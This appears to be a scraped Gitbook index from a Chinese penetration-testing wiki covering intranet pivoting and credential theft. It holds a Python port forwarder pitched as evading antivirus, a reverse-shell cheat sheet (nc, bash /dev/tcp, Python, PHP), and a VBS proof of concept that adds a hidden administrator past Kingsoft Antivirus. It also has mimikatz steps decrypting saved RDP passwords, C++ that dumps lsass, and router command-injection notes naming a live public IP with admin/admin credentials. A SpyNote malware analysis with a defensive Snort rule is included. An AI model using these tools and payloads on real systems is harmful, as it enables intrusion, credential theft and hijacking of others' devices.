采用PYTHON编写LCX工具，工具的使用效果感觉上是非常不错的，但是ptyhon程序打包成exe的体积相对比较庞大。笔者推荐使用asyncore 模块，Python的asyncore模块**了以异步的方式写入套接字服务的客户端和服务器的基础结构，使用比较方便。这个模块是一个以时间驱动的异步I/O，与C++的事件选择模型相似。每当发生写、读事件会交由我们重写的事件函数进行处理。下面开始编写自实现的LCX。 1、第一步需要先定义Forwarder： class PortForwarder(asyncore.dispatcher):#监听本地 def __init__(self, ip, port, remoteip, remoteport, backlog=5): asyncore.dispatcher.__init__(self) self.remoteip = remoteip self.remoteport = remoteport self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建一个套接字对象 self.set_reuse_addr()#设置地址端口可重用 self.bind((ip, port))#绑定本地ip与端口 self.listen(backlog)#开始监听 def handle_accept(self):#处理接受 conn, addr = self.accept()#等待接受 print \"Connected to:\", addr Sender(Receiver(conn), self.remoteip, self.remoteport) 2、第二步调用Forwarder,并且执行asyncore.loop（用于循环监听网络事件）: PortForwarder(local_host, local_port, remote_host, remote_port) asyncore.loop() 3、需要接*本地的请求，发给远程主机: class Receiver(asyncore.dispatcher):#接受本地请求数据，发送给远程主机 def __init__(self, conn): asyncore.dispatcher.__init__(self, conn) #self被初始化为该连接客户端socket #getpeername函数用于获取与某个套接字关联的外地协议地址 self.from_remote_buffer = ''#保存来自远程主机数据 self.to_remote_buffer = '' #保存本地请求数据 self.sender = None def handle_connect(self): pass def handle_read(self):#接受本地请求 read = self.recv(BUFSIZE) self.to_remote_buffer += read; print \"receiver read\", self.to_remote_buffer def writable(self):#判断是否有来自远程主机的数据，如果有，调用handle_write return (len(self.from_remote_buffer) > 0) def handle_write(self):#发送来自远程主机的数据给本地主机 sent = self.send(self.from_remote_buffer) print \"receiver sent\", sent self.from_remote_buffer = self.from_remote_buffer[sent:]#发送完成后清空数据 def handle_close(self): self.close() if self.sender: self.sender.close() 4、需要接受远程主机数据，发给本地请求： class Sender(asyncore.dispatcher):#接受远程主机数据，发送本地请求数据 def __init__(self, receiver, remoteaddr, remoteport): asyncore.dispatcher.__init__(self) self.receiver = receiver#建立Sender与Receiver之间联系 receiver.sender = self #建立Sender与Receiver之间联系 self.create_socket(socket.AF_INET, socket.SOCK_STREAM)#创建套接字 self.connect((remoteaddr, remoteport))#连接远程主机 def handle_connect(self): pass def handle_read(self):#接受来自远程主机的数据 read = self.recv(BUFSIZE) self.receiver.from_remote_buffer += read print \"sender read\", self.receiver.from_remote_buffer def writable(self):#判断是否有本地请求要发送，如果有，调用handle_write if len(self.receiver.to_remote_buffer) > 0: self.receiver.to_remote_buffer = self.receiver.to_remote_buffer.replace\\ (LOCAL_SERVER_HOST + ':' + str(LOCAL_SERVER_PORT), REMOTE_SERVER_HOST) #修改本地请求数据，将本地主机中host改为远程主机地址 return (len(self.receiver.to_remote_buffer) > 0) def handle_write(self):#发送本地请求数据 sent = self.send(self.receiver.to_remote_buffer) print \"sender write\",sent self.receiver.to_remote_buffer = self.receiver.to_remote_buffer[sent:] def handle_close(self): self.close() self.receiver.close() 到此一个简单的LCX程序就完成了，如果添加一些命令行交互提示功能，对于使用者将更加友好 三.总结 对于LCX原理以及实现思路，简单整理这么多。目前来说LCX这类程序，已经被杀毒软件列为木马。python编写程序的优势在于能够绕过杀毒软件的查杀。对于目的地址转发这项工作来说所需的代码比较少量，但是由于PYTHON打包成EXE时会内置编译器，所以EXE程序会相对比较大。如果将部分代码进行优化，能够比较好的缩减代码量。不过虽然代码量可能会有所减少，但是打包后的体积依旧比较大。对于这点目前并尚未找到妥善的解决方法。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:47:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/nc/1.html":{"url":"内网渗透/内网穿透/nc/1.html","title":"nc","keywords":"","body":"nc反弹常用命令 用 nc 反弹，命令如下： nc 1024 -e /bin/sh 某些目标的 nc 不支持 -e 参数，有两个解决思路，要么使用其他版本的 nc： nc.traditional 1024 -e /bin/sh 要么配合命名管道进行反弹： rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 1024 >/tmp/f 用 bash 反弹： /bin/bash -i >& /dev/tcp//1024 0>&1 用 python 反弹： python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\",1024));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 用 PHP 反弹： php -r '$sock=fsockopen(\"\",1024);exec(\"/bin/sh -i &3 2>&3\");' 用 exec 反弹： 0/dev/tcp//1024; sh &196 2>&196 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:45:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/reGeorg/1.html":{"url":"内网渗透/内网穿透/reGeorg/1.html","title":"reGeorg","keywords":"","body":"reGeorg结合proxychains代理链(HTTP隧道) reGeory适用于公网服务器只开放了80端口的情况。 reGeorg是用 python 写的利用Web进行代理的工具，流量只通过 http 传输，也就是http隧道。 reGeorg 下载https://github.com/sensepost/reGeorg 上传对应语言版本的tunnel文件到服务器上。然后本地访问上传的源文件，即可在本地与远程主机上形成一个http的回路。命令如下： python reGeorgSocksProxy.py -p 6666 -u http://目标站点/xxx.jsp //端口随便指定，只要不与本机开放端口冲突即可 然后配置proxychains代理链的配置文件/etc/proxychains.conf ，将代理设置成本机的1080端口： socks5 127.0.0.1 1080 然后命令前面加上 proxychains即可。如： proxychains curl 192.168.10.19 所以我们流量的走向是： 流量->本地1080端口->web服务器的80端口(通过我们上传的php文件进行流量转发)->内网服务器->web服务器的80端口->本地1080端口 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:42:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/ssocks/1.html":{"url":"内网渗透/内网穿透/ssocks/1.html","title":"ssocks","keywords":"","body":"利用ssocks进行内网穿透 sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，而proxychains代理链是Linux下一款代理设置工具。由于Ssocks不稳定，所以不建议使用。 现在有这么一个环境，我们获取到了位于公网Web服务器的shell，该web服务器是Linux系统，内网中存在另外一台主机，这里假设内网存在一台Web服务器。然后，我们现在要将公网Web服务器设置为代理，访问和探测内网Web服务器的信息。 首先，我们的主机和公网的Web服务器都得安装上Ssocks。 proxychains的话 linux(基于debian)下直接apt install proxychains 就可以了 Web服务器的操作 ./rssocks -vv -s 100.100.10.13:9999 #接收100.100.10.13的9999端口的流量 主机的操作 首先配置proxychains代理链的配置文件，把最后的内容改成 socks5 127.0.0.1 8080 ./rcsocks -l 1080 -p 9999 -vv #然后将本地的1080端口的流量转发到9999端口 接下来，我们想要访问和操作操作内网主机192.168.10.19的话，只需要在命令前面加上 proxychains 比如，获得内网Web服务器的网页文件： proxychains curl 192.168.10.19 ssocks转发的其他操作 第一步，用sSocks在VPS上建立3388与3389端口对应关系，实现流量互通： root @ kali：〜＃/ root / ssocks-0.0.14 / src / rcsocks -l 3389 -p 3389 -vv 第二步，从攻击端连接VPS的3388端口，建议用freerdp而非rdesktop，因为前者支持远程与本地连接等待，文本复制粘贴，挂载远程文件系统： root @kali：〜＃xfreerdp / u：administrator / p：admin / v：【你的ip】：3389 第三步，立即在大马上执行端口转发，可能需要连续多次点击开始： 注意，整个过程对步骤先后顺序敏感，VPS上rcsocks端口映射好以后就可以不管了，先在攻击端执行xfreerdp，让其会话保持，再在webshel​​l上转发内网的3389。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:43:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网穿透/teamviewer/1.html":{"url":"内网渗透/内网穿透/teamviewer/1.html","title":"teamviewer","keywords":"","body":"Teamviewer内网穿透 这里利用的原理是强行给对方机子安装上teamviwer，然后自动把tv的远程连接的密码生成到程序目录下的vtr.txt里面中，随即用自己本机的tv联机就行了 Github地址 https://github.com/ianxtianxt/teamview 复现流程 Github下载完之后，传入受害机中(我这里是本地虚拟机，就直接演示了) 如图 运行TV_V2.exe 会自己在受害机中装一个tv 会在当前目录下生成如下三个文件 运行生成的gps.exe文件之后会生成vtr.txt里面有ID和通行证 咱们给他装的teamviewer的密码就被读出来啦 连接！ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:43:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/金山毒霸/1.html":{"url":"内网渗透/内网渗透/金山毒霸/1.html","title":"Bypass金山毒霸","keywords":"","body":"金山毒霸添加用拦截功能绕过 相关厂商 金山毒霸 漏洞类型 拦截绕过 自评危害等级 高危 详细介绍： 金山毒霸添加用拦截功能绕过 POC如下： set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\"):os=\"WinNT://\"&wsnetwork.ComputerName:Set ob=GetObject(os):Set oe=GetObject(os&\"/Administrators,group\"):Set od=ob.Create(\"user\",\"test\"):od.SetPassword \"password\":od.SetInfo:Set of=GetObject(os&\"/test\",user):oe.add os&\"/test\" 测试视频演示下载地址：https://pan.baidu.com/s/1YsRrLVeALZH0vudbCn6WPQ 0sec 链接如挂，请群内反馈,谢谢 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 00:52:27 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/DBscanner/1.html":{"url":"内网渗透/内网渗透/DBscanner/1.html","title":"DBscanner","keywords":"","body":"工具说明 自动扫描内网常见sql、no-sql数据库脚本(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)，包含未授权访问及常规弱口令检测 安装过程 运行于python2的环境下 pip install IPy pip install gevent pip install mysql-python /*如果遇到 WARNING: You are using pip version 19.2.3, however version 19.3 is available python -m pip install -U pip 下载 https://stackoverflow.com/questions/21440230/install-mysql-python-windows 然后，运行pip install mysqlclient；如果报错的话请运行pip install mysqlclient==1.3.4 安装低版本的mysqlclient */ pip install cx_Oracle pip install pymongo pip install psycopg2 注： 扫描整个c段的时候ip地址末尾一定要写0，否则会报错 python dbscan.py 192.168.50.0/24 Github: https://github.com/ianxtianxt/DBScanner/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 21:06:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/Windows常用程序密码读取工具/1.html":{"url":"内网渗透/内网渗透/Windows常用程序密码读取工具/1.html","title":"Windows常用程序密码读取工具","keywords":"","body":"Windows常用程序密码读取工具:SharpDecryptPwd 工具介绍 用于读取常用程序密码 如NavicatCrypto、TeamViewer、FileZilla、WinSCP等 使用方法 > SharpDecryptPwd.exe Author: Uknow Github: https://github.com/uknowsec/SharpDecryptPwd Reference: https://rcoil.me/2019/09/SharpDecryptPwd/ Usage: SharpDecryptPwd.exe -NavicatCrypto SharpDecryptPwd.exe -TeamViewer SharpDecryptPwd.exe -FileZilla SharpDecryptPwd.exe -WinSCP SharpDecryptPwd.exe -Xmangager -p Session_Path Github地址： https://github.com/ianxtianxt/SharpDecryptPwd/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 21:02:22 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/内网渗透之获取windows远程桌面（RDP）连接记录/1.html":{"url":"内网渗透/内网渗透/内网渗透之获取windows远程桌面（RDP）连接记录/1.html","title":"内网渗透之获取windows远程桌面（RDP）连接记录","keywords":"","body":"内网渗透之获取windows远程桌面（RDP）连接记录 利用条件：就是mstsc连接的时候，管理员勾选了自动保存密码连接的选项。 目标ip：172.xx.x.1 被控制ip:172.xx.x.12 在172.18.x.12中执行 C:\\Users\\Administrator>cmdkey /list 当前保存的凭据: 目标: LegacyGeneric:target=TERMSRV/172.xx.x.1 类型: 普通 用户: I3L2JDBDV6JENUP\\Administrator 本地机器持续时间 目标: LegacyGeneric:target=TERMSRV/xxxxx.xxxx.org 类型: 普通 用户: administrator 本地机器持续时间 如此可见，此服务器保存了两个连接地址，其中的172.xx.x.1就是我们想要获取到的地址。 1、查找本地的Credentials dir /a %userprofile%\\AppData\\Local\\Microsoft\\Credentials\\* * 驱动器 C 中的卷是 系统 卷的序列号是 0000-6B3E C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials 的目录 2018/11/10 14:04 . 2018/11/10 14:04 .. 2018/11/09 17:05 466 92FB159ED290FC523E845094404697A8 2018/11/10 14:04 466 A1EC182214DD58D50DAB9E8850A9E75A 2 个文件 932 字节 2 个目录 3,507,884,032 可用字节 2、使用mimikatz进行操作 mimikatz dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 得到内容为： beacon> mimikatz dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 [*] Tasked beacon to run mimikatz's dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 command [+] host called home, sent: 961605 bytes [+] received output: **BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {9cb35799-f2c5-4897-9d60-3b84331db8ae} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 00000012 - 18 szDescription : 本地凭据数据 algCrypt : 00006610 - 26128 (CALG_AES_256) dwAlgCryptLen : 00000100 - 256 dwSaltLen : 00000020 - 32 pbSalt : 8498307858a1e635b05a9e0dc6256e8ed91216ce3a562e678cc937ad4f9434ba dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 0000800e - 32782 (CALG_SHA_512) dwAlgHashLen : 00000200 - 512 dwHmac2KeyLen : 00000020 - 32 pbHmack2Key : 613bfaa4841894899cf3fa3bd34318c0e3ad53e5403c10d126f940c1cd91f510 dwDataLen : 000000e0 - 224 pbData : 9dd8efd32175a018eef0a0b52c2c082086ec677d2799926b69515b3fcac634ef7b0e1e0f202ba17934d38323e9b068bdef0d08cb3235d5a8efcbb55522f5f1b0f684f216a1a900a6b225863a54395b21dd4fcc699c71f31ba4fcb87292011b29ae12416509590fe30d9440672bb7ad2e02c4d797eef091afc9d48bdaf9d13659f2677b257071ffa60823c32efb2614d0604caaa1e112bef950002249dc555f04662be1ffb2ac0e7a7fb66c52ceb9479fa3150b7495d376627646aa8daaef18345281993db292bf8b39a2049d4b3bc9f914e31f03099677d84d7074b5c146327f dwSignLen : 00000040 - 64 pbSign : 1c5d185d5db9a9cdd6e3190d5236f36eddf84b08e3820cbfeff5026e0127adf103eeae501bd7f57003429a4b6ce30d9c3e7a3e16a3ee2b6514e5a631735a8987 3、使用sekurlsa::dpapi beacon> mimikatz sekurlsa::dpapi [*] Tasked beacon to run mimikatz's sekurlsa::dpapi command [+] host called home, sent: 961609 bytes [+] received output: Authentication Id : 0 ; 844082 (00000000:000ce132) Session : Interactive from 1 User Name : Administrator Domain : SD-201805241744 Logon Server : SD-201805241744 Logon Time : 2018/11/29 9:35:37 SID : S-1-5-21-879709706-2682151700-2389522846-500 [00000000] * GUID : {9cb35799-f2c5-4897-9d60-3b84331db8ae} * Time : 2018/12/8 15:37:36 * MasterKey : 6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561 * sha1(key) : d6cf5badd4fd758ac728878b8109ac8b3a6af865 [00000001] * GUID : {f9154b95-65a8-498d-9b24-f4c248ba70bb} * Time : 2018/12/11 17:45:59 * MasterKey : ec0864068100a6f158e8fa7be7b1e18bdb91cf4baba90d913ca060db56d8ca82c0a643cfd11a8303fbd04b2ad44bf2bbe5c494ee68d35fd7af1127b936c2b5b6 * sha1(key) : 06a11e1d91806cadbe06f010a0031cdb71ec4346 Authentication Id : 0 ; 997 (00000000:000003e5) Session : Service from 0 User Name : LOCAL SERVICE Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2018/11/29 9:16:48 SID : S-1-5-19 Authentication Id : 0 ; 996 (00000000:000003e4) Session : Service from 0 User Name : SD-201805241744$ Domain : WorkGroup Logon Server : (null) Logon Time : 2018/11/29 9:16:47 SID : S-1-5-20 Authentication Id : 0 ; 49720 (00000000:0000c238) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2018/11/29 9:16:46 SID : Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : SD-201805241744$ Domain : WorkGroup Logon Server : (null) Logon Time : 2018/11/29 9:16:46 SID : S-1-5-18 [00000000] * GUID : {e596b8f9-6923-4853-a59c-51d3346000dd} * Time : 2018/11/29 9:16:59 * MasterKey : de7a5ebccbeccaa08b4f9daeda81af94daf4ce53b22400bc26c281a68d7081d2a4039f359131890b9089917714b8810b25ec7658fa1e62cc2941630d307b89d4 * sha1(key) : 929fa099c7c1bf0293da3a9dbefc19ffe1c7d345 [00000001] * GUID : {77b81995-c130-478f-a592-7041d039f446} * Time : 2018/11/29 9:59:38 * MasterKey : ec6dcf103d177c4e69faac61e182e55d4ee7c6e242d9a5c6a5cde08aa440573155981c91340c4214cbc4911da628a3af2503b82d338b9ab2dee53b33fa044fdc * sha1(key) : dbda555a0e9740db7c61c5ce5880c4baaefdce28 [00000002] * GUID : {f1625647-969c-4fff-a63a-f77e4242b229} * Time : 2018/11/29 19:37:12 * MasterKey : 6ddc8cb28575ddd652fd1c88a9594d3a4a62607959acbf6e3a89e8372d577f6966f3420c47e086ae04e07afd0d778e100bc6408ea374087ee51fced40f5eccde * sha1(key) : b155b36b7f91ea110b42c479a6d40579f3e992ef [00000003] * GUID : {f22e410f-f947-4e08-8f2a-8f65df603f8d} * Time : 2018/11/29 9:16:46 * MasterKey : 19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa * sha1(key) : b859b2b52e7e49cf5c70069745c88853c4b23487 根据目标凭据 GUID: {9cb35799-f2c5-4897-9d60-3b84331db8ae} 找到其关联的MasterKey，这个MasterKey就是加密凭据的密钥，即解密pbData所必须的东西。 4、解密 命令为： dpapi::cred /in:C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Credentials\\92FB159ED290FC523E845094404697A8 /masterkey:6d3bb90e91c05b6561e9714f37d651c1297a36675299a2172d7bee9e3922dd26842d4b0bf1d246c61d6f1fe845bc48303a8d46138813e9aed552e1919c555561 随即即可获取到密码 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-21 22:11:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"内网渗透/内网渗透/利用windows api dump进程/1.html":{"url":"内网渗透/内网渗透/利用windows api dump进程/1.html","title":"利用windows api dump进程","keywords":"","body":"利用windows api dump进程 c++源代码 #include \"stdafx.h\" #include #include #include #include using namespace std; int main() { DWORD lsassPID = 0; HANDLE lsassHandle = NULL; HANDLE outFile = CreateFile(L\"lsass.dmp\", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 processEntry = {}; processEntry.dwSize = sizeof(PROCESSENTRY32); LPCWSTR processName = L\"\"; if (Process32First(snapshot, &processEntry)) { while (_wcsicmp(processName, L\"lsass.exe\") != 0) { Process32Next(snapshot, &processEntry); processName = processEntry.szExeFile; lsassPID = processEntry.th32ProcessID; } wcout https://github.com/ianxtianxt/windows-api-dump/ 执行演示 执行CreateMiniDump.exe（上面的编译文件）或编译自己的二进制文件 Lsass.dmp被转储到工作目录 让lsass.dmp离线到你的攻击机器上 打开mimikatz并加载到转储文件中 储存密码 .\\createminidump.exe .\\mimikatz.exe sekurlsa::minidump c:\\temp\\lsass.dmp sekurlsa::logonpasswords 可以在mimikatz中离线读取 这里有一个pdocdump可以执行相同的操作，并且不会被windows defender标记。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-26 17:45:40 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"移动安全/SpyNote5.0客户端APK逆向分析/SpyNote5.0客户端APK逆向分析.html":{"url":"移动安全/SpyNote5.0客户端APK逆向分析/SpyNote5.0客户端APK逆向分析.html","title":"SpyNote5.0客户端APK逆向分析","keywords":"","body":"SpyNote5.0 Client_APK逆向分析 ----柠檬菠萝 1. SpyNote5.0 是什么? SpyNote是用来创建Android恶意程序的工具。它的功能引人注目，读取联系人、录音、命令执行、应用管理、键盘记录、GPS定位等等。 这些功能对于研究安Android端恶意程序起到承上启下的作用。 咱们能够通过一系列文章对于它的使用初步了解，《SpyNote V5.0图形化工具远程管理Android手机教程》、《小心，Android木马工具SpyNote免费啦！远程监听就是这么简单》、《当心，安卓远控（spynote）升级了……》等等。 2. 准备工具 对于SpyNote5.0 Client_APK的逆向分析却鲜有人问津，下面我简单介绍使用工具，然后开始进入逆向分析环节。 1) SpyNote5.0 下载地址：https://github.com/soDLL/SpyNote OR https://github.com/miladzero/SpyNote 2) jadx-gui 下载地址: https://github.com/skylot/jadx/releases 3) androidkiller 下载地址: https://www.guguzhu.com/soft/270509.html 3. 开始逆向分析 咱们开始对于Client_APK进行分析，通常喜欢将客户端生成的APK程序拖入androidkiller。（如何生成客户端请见上文的几篇文章） 拖入程序后androidkiller会自动进行反汇编，然后有程序分析结果。 在左侧按照继承关系分类Activity、Receiver、Service和应用权限(Uses-Permisson),能够看到客户端需要的应用权限很多。右侧则是smail汇编窗口和工作台。 通过这个工具能清楚看到权限以及各类继承关系，但是工具版本比较低，代码还原的不完善。 我将工具换成jadx-gui，然后继续开始逆向分析，将Client_APK导入。 咱们能看到三个包，分别是android.support，con.eset.ems2.gp，yps.eton.application。其中android.support为安卓本支持包其中包括低版本、v4、v7，con.eset.ems2.gp为配置包里面包含了host、client_name等信息，yps.eton.application则是咱们需要分析的。 打开yps.eton.application，咱们能看到14个类,由于需要分析的代码比较多，所以有针对性的对于部分关键代码进行分析。 通过之前androidkiller分析结构能够看到,A、F、G、k 这个写类继承了Service，Service 在安卓系统中代表后台持续运行。咱们不妨猜下，Client_APK中需要持续运行的可能会有什么？也许是关键对象会持续运行、受控、监听、多线程等等。咱们本次分析的重点是它部分功能以及如何识别流量。 3.1 命令执行启动分析 咱们从A方法开始,A方法开始启动服务，遍历了R对象，取第三个元素，如果他等于1则执行j()。否则在判断a()是否已经被实例化后启动服务。在之后会继续判断j()是否具备root权限。 继续看j()，j()中使用执行su命令后，将Do I have root?写入文件/system/sd/temporary.txt，对于是否为root权限进行了判断。 接着看h()，之中使用了多线程，获取R对象中的存储的配置参数，采用循环和socket回传信息。 3.2 Base64编码应用部分功能分析 在查看A对象的导入列表时候发现之中包含android.util.Base64,说明在运行之中使用了base64编码。紧接着搜索关键字Base64，能够看到Base64包裹着((BitmapDrawable) applicationIcon).getBitmap()，其实内部就是应用图标。客户端将一些信息通过c0c1c3a2c0c1c分割以9xf89fff9xf89结尾进行传递，对于异常信息和选项采用fxf0x4x4x0fxf分割传递。 public void k() { new Thread(new Runnable() { public void run() { String str; try { StringBuffer stringBuffer = new StringBuffer(); PackageManager packageManager = A.this.getApplicationContext().getPackageManager(); for (ApplicationInfo applicationInfo : packageManager.getInstalledApplications(128)) { if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null && !packageManager.getLaunchIntentForPackage(applicationInfo.packageName).equals(\"\")) { try { Date date = new Date(packageManager.getPackageInfo(applicationInfo.packageName, 4096).firstInstallTime); String str2 = packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null ? (applicationInfo.flags & 1) == 1 ? \"system\" : \"user\" : \"\"; Drawable applicationIcon = packageManager.getApplicationIcon(applicationInfo.packageName); String str3 = new String(); if (applicationIcon != null) { Bitmap bitmap = ((BitmapDrawable) applicationIcon).getBitmap(); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); bitmap.compress(CompressFormat.JPEG, 50, byteArrayOutputStream); str = Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2); } else { str = str3; } stringBuffer.append(packageManager.getApplicationLabel(applicationInfo) + \"c0c1c3a2c0c1c\" + applicationInfo.packageName + \"c0c1c3a2c0c1c\" + str + \"c0c1c3a2c0c1c\" + str2 + \"c0c1c3a2c0c1c\" + date.toString() + \"c0c1c3a2c0c1c\" + A.this.getPackageName() + \"9xf89fff9xf89\"); } catch (NameNotFoundException e) { A.this.h(\"applicationsfxf0x4x4x0fxf[My/Exception]\" + e.getMessage().toString()); } } } A.this.h(\"applicationsfxf0x4x4x0fxf\" + stringBuffer.toString()); } catch (Exception e2) { A.this.h(\"applicationsfxf0x4x4x0fxf[My/Exception]\" + e2.getMessage().toString()); } } }).start(); } 3.3 信息获取部分功能分析 b方法是A对象中最长的方法，里面包含着switch case语句分支太多导致反汇编异常。观察注释不难看出，里面实现了大多数的获取信息的逻辑。例如：Device info、System info、Sim info、WIFI info等等，包含了工具所宣传的功能。 在b方法的重写里面有些地方值得注意，这里用于获取存储路径。传输路径信息的分隔符使用e1x1114x61114e。文件名信息分隔符使用-1c0c1c3a2c0c1c-1c0c1c3a2c0c1c-1c0c1c3a2c0c1c。通过这些信息能够较为准确的判断客户端传递时的操作。 4. 总结 在分析过程中能够看到各个功能的实现。Client使用了未加密和Base编码传输，传输过程中最明显的是分割符号。通过程序能够有效地判断，Client的传输行为。对于传输过程进行抓包。 图中明显看到分隔符号和base64编码内容。对于这点咱们可以在Snort中编写规则进行识别，识别示例： alert tcp any any -> any any (content:\"fxf0x4x4x0fxf\"; sid:1; msg:SpyNote5.0 Client;) 首发于合天智汇 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 13:07:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/默认设备密码/默认设备密码.html":{"url":"iot/默认设备密码/默认设备密码.html","title":"默认设备密码","keywords":"","body":"默认设备密码 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 17:17:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/2.html":{"url":"iot/D-Link/2.html","title":"(CVE-2019-15529)D-Link DIR-823G","keywords":"","body":"D-Link DIR-823G(CVE-2019-15529) 一、漏洞简介 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。 使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 二、漏洞影响 DIR823GA1_FW102B05 三、复现过程 1.下载D-Link DIR-823G固件，http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-823G 2.在固件版本为V1.0.2B05的D-Link DIR823G设备上存在一个问题，能偶通过用户名字段中注入命令进行登录。 3.攻击载荷 4.漏洞细节 5.写入文件 原文地址:https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/823G-102B05-1.pdf 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-07 10:57:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/D-Link/1.html":{"url":"iot/D-Link/1.html","title":"(CVE-2019-13128)D-Link DIR-823G命令注入漏洞","keywords":"","body":"D-Link DIR-823G 命令注入漏洞 (CVE-2019-13128) 影响版本 DIR823GA1_FW102B03 漏洞描述 这个问题存在于DIR823GA1固件FW102B03版本，网关(Gateway\")的选项设置静态路由(SetStaticRouterSettings)，IP地址选项(IPAddress\")，存在命令注入。 漏洞POC 选择IP地址(IPAddress)提交信息，在数据包修改。 如图所示。 原文地址:https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/DIR-823G-v2.pdf 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 21:16:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/JCG/1.html":{"url":"iot/JCG/1.html","title":"JCG路由器命令执行漏洞","keywords":"","body":"漏洞标题 JCG路由器命令执行漏洞 漏洞环境 漏洞复现 Shandan上搜到相关信息 选择一个测试：http://216.171.4.173/home.asp 默认密码：admin/admin 